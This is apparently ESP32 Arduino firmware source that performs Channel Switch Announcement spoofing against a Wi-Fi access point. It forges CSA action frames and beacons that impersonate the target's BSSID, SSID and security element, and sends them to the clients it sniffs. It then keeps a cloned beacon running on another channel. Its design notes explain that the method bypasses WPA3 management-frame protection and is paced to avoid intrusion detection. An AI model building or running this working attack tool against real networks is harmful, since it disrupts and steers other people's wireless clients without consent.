// CSA (Channel Switch Announcement) spoofing.
//
// Design notes (why it is shaped this way):
//   * CSA is *not* a robust management frame, so 802.11w/PMF does not verify it.
//     That is what makes it usable against WPA3 clients when deauth is dead.
//   * A real AP announces count N..1 on consecutive beacon ticks. A single
//     count=1 frame looks like an anomaly to any WIDS, so this sends a monotonic
//     countdown at ~100 TU (100 ms).
//   * Broadcast CSA is seen by everyone but some drivers only act on unicast, so
//     both forms are sent (~3 broadcast : 1 unicast per known client).
//   * After the countdown the radio hops to the new channel and keeps a cloned
//     beacon (same BSSID/SSID/RSN IE) alive; otherwise clients rescan the old
//     channel within seconds and nothing is achieved.

#include "csa.h"

#include <Arduino.h>
#include <WiFi.h>
#include <esp_wifi.h>
#include <string.h>

namespace {

const uint8_t kBroadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};

enum csa_phase_t {
    CSA_IDLE = 0,
    CSA_ANNOUNCE,  // count N..1 on the AP's channel
    CSA_HOLD,      // cloned beacon on the new channel
};

volatile csa_phase_t s_phase = CSA_IDLE;
uint8_t s_bssid[6];
char s_ssid[33];
uint8_t s_ssid_len;
uint8_t s_ap_channel;
uint8_t s_new_channel;
uint8_t s_count;
uint32_t s_last_tick;
uint32_t s_hold_until;

// Clients seen on the target BSS (for unicast CSA), most recent last.
const int kMaxClients = 8;
uint8_t s_clients[kMaxClients][6];
int s_client_count;

// RSN IE copied from a real beacon of the target (so the clone advertises the
// same security parameters instead of looking like a downgrade).
const int kMaxRsn = 64;
uint8_t s_rsn[kMaxRsn];
uint8_t s_rsn_len;
uint16_t s_capability;

uint32_t s_frames;

void note_client(const uint8_t* mac) {
    if (memcmp(mac, kBroadcast, 6) == 0 || memcmp(mac, s_bssid, 6) == 0) {
        return;
    }
    if ((mac[0] & 0x01) != 0) {
        return;  // multicast
    }
    for (int i = 0; i < s_client_count; i++) {
        if (memcmp(s_clients[i], mac, 6) == 0) {
            return;
        }
    }
    if (s_client_count >= kMaxClients) {
        memmove(s_clients[0], s_clients[1], 6 * (kMaxClients - 1));
        s_client_count = kMaxClients - 1;
    }
    memcpy(s_clients[s_client_count++], mac, 6);
}

// Walks the IE list of a real beacon and keeps the RSN element (id 48).
void learn_from_beacon(const uint8_t* frame, uint16_t len) {
    if (len <= 36) {
        return;
    }
    const uint16_t cap = (uint16_t)(frame[34] | (frame[35] << 8));
    if (cap != 0) {
        s_capability = cap;
    }
    const uint8_t* p = frame + 36;  // 24 hdr + 12 fixed params
    const uint8_t* end = frame + len;
    while (p + 2 <= end) {
        const uint8_t id = p[0];
        const uint8_t ie_len = p[1];
        if (p + 2 + ie_len > end) {
            break;
        }
        if (id == 48 && s_rsn_len == 0 && 2 + ie_len <= kMaxRsn) {
            memcpy(s_rsn, p, (size_t)(2 + ie_len));
            s_rsn_len = (uint8_t)(2 + ie_len);
        }
        p += 2 + ie_len;
    }
}

// Action frame: 24 B header + category(4) + action(4) + mode + channel + count.
size_t build_csa_action(uint8_t* frame, const uint8_t ra[6], uint8_t channel, uint8_t count) {
    memset(frame, 0, 32);
    frame[0] = (uint8_t)((13 << 4) | 0x00);  // management, subtype 13 = action
    frame[1] = 0x00;
    memcpy(frame + 4, ra, 6);
    memcpy(frame + 10, s_bssid, 6);
    memcpy(frame + 16, s_bssid, 6);
    frame[22] = 0xF0;
    frame[23] = 0xFF;
    frame[24] = 4;         // category: spectrum management
    frame[25] = 4;         // action: channel switch announcement
    frame[26] = 0;         // mode 0 = keep transmitting (1 = quiet, stronger)
    frame[27] = channel;   // new channel
    frame[28] = count;     // countdown in TBTTs
    return 29;
}

// Beacon carrying a CSA IE (element 37), the second announcement path.
size_t build_beacon(uint8_t* frame, uint8_t channel, bool announce, uint8_t count) {
    size_t n = 0;
    memset(frame, 0, 140);
    frame[n++] = 0x80;  // beacon
    frame[n++] = 0x00;
    frame[n++] = 0x00;
    frame[n++] = 0x00;
    memcpy(frame + n, kBroadcast, 6);
    n += 6;
    memcpy(frame + n, s_bssid, 6);
    n += 6;
    memcpy(frame + n, s_bssid, 6);
    n += 6;
    frame[n++] = 0x00;
    frame[n++] = 0x00;
    memset(frame + n, 0, 8);  // timestamp
    n += 8;
    frame[n++] = 0x64;  // beacon interval 100 TU
    frame[n++] = 0x00;
    const uint16_t cap = s_capability != 0 ? s_capability : (uint16_t)(s_rsn_len > 0 ? 0x0411 : 0x0401);
    frame[n++] = (uint8_t)(cap & 0xFF);
    frame[n++] = (uint8_t)(cap >> 8);
    frame[n++] = 0;  // SSID
    frame[n++] = s_ssid_len;
    memcpy(frame + n, s_ssid, s_ssid_len);
    n += s_ssid_len;
    static const uint8_t rates[] = {0x82, 0x84, 0x8B, 0x96, 0x0C, 0x12, 0x18, 0x24};
    frame[n++] = 1;  // supported rates
    frame[n++] = sizeof(rates);
    memcpy(frame + n, rates, sizeof(rates));
    n += sizeof(rates);
    frame[n++] = 3;  // DS parameter set
    frame[n++] = 1;
    frame[n++] = channel;
    if (s_rsn_len > 0 && n + s_rsn_len < 120) {
        memcpy(frame + n, s_rsn, s_rsn_len);
        n += s_rsn_len;
    }
    if (announce) {
        frame[n++] = 37;  // CSA IE
        frame[n++] = 3;
        frame[n++] = 0;  // mode 0
        frame[n++] = s_new_channel;
        frame[n++] = count;
    }
    return n;
}

void tx(uint8_t* frame, size_t len) {
    if (esp_wifi_80211_tx(WIFI_IF_STA, frame, len, false) == ESP_OK) {
        s_frames++;
    }
}

void send_csa_round(uint8_t count) {
    uint8_t frame[140];
    for (int i = 0; i < 3; i++) {
        tx(frame, build_csa_action(frame, kBroadcast, s_new_channel, count));
    }
    for (int c = 0; c < s_client_count; c++) {
        tx(frame, build_csa_action(frame, s_clients[c], s_new_channel, count));
    }
    tx(frame, build_beacon(frame, s_ap_channel, true, count));
}

void send_clone_beacon(void) {
    uint8_t frame[140];
    tx(frame, build_beacon(frame, s_new_channel, false, 0));
}

}  // namespace

bool csa_start(int index, uint8_t new_channel, uint8_t start_count, uint16_t hold_seconds) {
    const uint8_t* bssid = WiFi.BSSID(index);
    if (bssid == nullptr) {
        return false;
    }
    const String ssid = WiFi.SSID(index);
    memcpy(s_bssid, bssid, 6);
    s_ssid_len = (uint8_t)(ssid.length() > 32 ? 32 : ssid.length());
    memcpy(s_ssid, ssid.c_str(), s_ssid_len);
    s_ssid[s_ssid_len] = 0;
    s_ap_channel = WiFi.channel(index);
    s_new_channel = new_channel;
    s_count = start_count < 2 ? 2 : (start_count > 8 ? 8 : start_count);
    s_client_count = 0;
    s_rsn_len = 0;
    s_capability = 0;
    s_frames = 0;
    s_hold_until = millis() + (uint32_t)hold_seconds * 1000UL;

    esp_wifi_set_channel(s_ap_channel, WIFI_SECOND_CHAN_NONE);
    esp_wifi_set_promiscuous(true);
    s_last_tick = millis() - 100;  // fire on the next step
    s_phase = CSA_ANNOUNCE;
    return true;
}

void csa_stop(void) {
    s_phase = CSA_IDLE;
}

void csa_step(void) {
    if (s_phase == CSA_IDLE) {
        return;
    }
    const uint32_t now = millis();

    if (s_phase == CSA_ANNOUNCE) {
        if (now - s_last_tick < 100) {
            return;
        }
        s_last_tick = now;
        send_csa_round(s_count);
        if (s_count > 1) {
            s_count--;
            return;
        }
        esp_wifi_set_channel(s_new_channel, WIFI_SECOND_CHAN_NONE);
        s_phase = CSA_HOLD;
        return;
    }

    if (s_phase == CSA_HOLD) {
        if (now - s_last_tick >= 100) {
            s_last_tick = now;
            send_clone_beacon();
        }
        if ((int32_t)(now - s_hold_until) >= 0) {
            csa_stop();
        }
    }
}

void csa_on_rx(const uint8_t* frame, uint16_t len, uint8_t type, uint8_t subtype) {
    if (s_phase != CSA_ANNOUNCE || len < 24) {
        return;
    }
    const uint8_t* dest = frame + 4;
    const uint8_t* src = frame + 10;
    const uint8_t* bssid = frame + 16;
    const bool from_ap = memcmp(src, s_bssid, 6) == 0;
    if (!from_ap && memcmp(bssid, s_bssid, 6) != 0) {
        return;
    }
    note_client(from_ap ? dest : src);
    if (from_ap && type == 0 && subtype == 8 && s_rsn_len == 0) {
        learn_from_beacon(frame, len);
    }
}

// Prints the exact bytes of both frames so the format can be checked against
// 802.11-2020 (and pasted into a bug report) without a second radio.
void csa_selftest(void) {
    if (s_ssid_len == 0) {
        memcpy(s_ssid, "CSATEST", 7);
        s_ssid_len = 7;
    }
    if (s_new_channel == 0) {
        s_new_channel = 6;
    }
    // Selftest may run before any CSA start, so give the dump a readable BSSID
    // instead of 00:00:00:00:00:00 (a real start always comes from SCAN).
    static const uint8_t placeholder[6] = {0x02, 0x11, 0x22, 0x33, 0x44, 0x55};
    if (s_bssid[0] == 0 && s_bssid[1] == 0 && s_bssid[2] == 0) {
        memcpy(s_bssid, placeholder, 6);
    }
    uint8_t frame[140];

    const size_t alen = build_csa_action(frame, kBroadcast, s_new_channel, 5);
    Serial.printf("CSATEST action len=%u cat=%u act=%u mode=%u nch=%u cnt=%u\n", (unsigned)alen,
                  (unsigned)frame[24], (unsigned)frame[25], (unsigned)frame[26],
                  (unsigned)frame[27], (unsigned)frame[28]);
    Serial.print("CSATEST action hex=");
    for (size_t i = 0; i < alen; i++) {
        Serial.printf("%02X", frame[i]);
    }
    Serial.println();

    const size_t blen = build_beacon(frame, s_ap_channel ? s_ap_channel : 1, true, 5);
    // Walk to the CSA IE so the printed offsets can be checked.
    size_t ie_off = 0;
    for (size_t i = 36; i + 2 <= blen; i += 2 + frame[i + 1]) {
        if (frame[i] == 37) {
            ie_off = i;
            break;
        }
    }
    Serial.printf("CSATEST beacon len=%u csa_ie_off=%u id=%u ie_len=%u mode=%u nch=%u cnt=%u\n",
                  (unsigned)blen, (unsigned)ie_off, (unsigned)frame[ie_off],
                  (unsigned)frame[ie_off + 1], (unsigned)frame[ie_off + 2],
                  (unsigned)frame[ie_off + 3], (unsigned)frame[ie_off + 4]);
    Serial.print("CSATEST beacon hex=");
    for (size_t i = 0; i < blen; i++) {
        Serial.printf("%02X", frame[i]);
    }
    Serial.println();
}

bool csa_active(void) {
    return s_phase != CSA_IDLE;
}

uint32_t csa_frames(void) {
    return s_frames;
}

uint32_t csa_clients(void) {
    return (uint32_t)s_client_count;
}

uint8_t csa_new_channel(void) {
    return s_new_channel;
}

uint8_t csa_current_count(void) {
    return s_count;
}

bool csa_have_rsn(void) {
    return s_rsn_len > 0;
}

const char* csa_phase_name(void) {
    switch (s_phase) {
        case CSA_ANNOUNCE:
            return "announce";
        case CSA_HOLD:
            return "hold";
        default:
            return "idle";
    }
}
